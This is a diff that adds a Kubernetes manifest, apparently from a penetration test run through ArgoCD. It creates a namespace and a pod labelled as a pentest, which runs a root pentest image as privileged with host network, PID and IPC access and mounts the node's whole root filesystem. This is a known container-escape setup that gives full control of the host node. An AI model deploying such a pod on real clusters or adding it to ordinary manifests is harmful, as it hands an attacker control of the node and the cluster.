@@ -1,0 +1,30 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: ns-via-argocd
+spec: {}
+status: {}
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privpod-01
+  namespace: ns-via-argocd
+  labels:
+    pentest: cloudsecconsult
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: container
+    image: cloudsecconsult/pentest:main-1.0.0-root-2026-04-01-0343
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /node
+      name: noderoot
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
